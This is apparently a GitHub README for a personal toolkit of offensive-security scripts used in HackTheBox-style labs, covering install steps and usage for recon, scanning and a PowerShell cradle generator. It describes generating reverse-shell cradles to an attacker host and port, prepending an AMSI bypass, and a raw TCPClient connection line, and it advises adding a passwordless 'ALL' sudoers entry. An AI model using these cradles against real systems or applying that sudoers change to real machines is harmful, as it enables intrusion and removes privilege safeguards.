# scripts

Here are a collection of scripts I use regularly for offensive security-related tasks.

![](img/recon_setup_demo.gif)

## Install

```bash
# Install dependencies (kali only)
sudo apt install python3-impacket python3-libtmux python3-requests python3-rich python3-urllib3 python3-watchdog

# Clone repo and cd
sudo git clone https://github.com/Mojo8898/scripts.git /opt/scripts
cd /opt/scripts

# Set standalone scripts as to be executable
sudo chmod +x recon_setup/recon_setup.py cradle_gen.py scan_machine.py scan_targets.py

# Create symbolic links to add standalone scripts to $PATH (pipx compatibility coming soon?)
ln -s /opt/scripts/recon_setup/recon_setup.py /usr/local/bin/recon_setup.py
ln -s /opt/scripts/scan_machine.py /usr/local/bin/scan_machine.py
ln -s /opt/scripts/scan_targets.py /usr/local/bin/scan_targets.py
ln -s /opt/scripts/cradle_gen.py /usr/local/bin/cradle_gen.py
```

Some automated scripts including the built-in nmap wrapper require sudo to run properly. Either execute scripts as root or add the following line to the bottom of your `/etc/sudoers` file using the command `sudo visudo` to prevent password prompts.

```
kali    ALL=(ALL) NOPASSWD: ALL
```

## Example Usage

### recon_setup.py

```bash
# Just configure working environment
recon_setup.py -i 10.10.10.10 testing ~/htb/competitive_Mojo098.ovpn

# Configure working environment and launch automated tasks
recon_setup.py -i 10.10.10.10 testing ~/htb/competitive_Mojo098.ovpn -a -u bob -p 'Password123!'

# Launch inside of exegol
recon_setup.py
```

### scan_machine.py

```bash
scan_machine.py 10.10.10.10
```

### scan_targets.py

```bash
scan_targets.py external_hosts.txt
```

### cradle_gen.py

```bash
cradle_gen.py 10.10.10.10 9001 -l
```

**Note:**
- To include an AMSI bypass with the Powercat cradle, create a file named amsi_bypass.txt in this project’s root directory. This file should contain the AMSI bypass code that will be prepended to the generated cradle.
- To include a raw socket PowerShell cradle, create a file named raw_socket.txt in this project’s root directory. Within this file, define the connection using Python’s string formatting placeholders for lhost and lport. For example:

```
System.Net.Sockets.TCPClient('{lhost}',{lport})
```
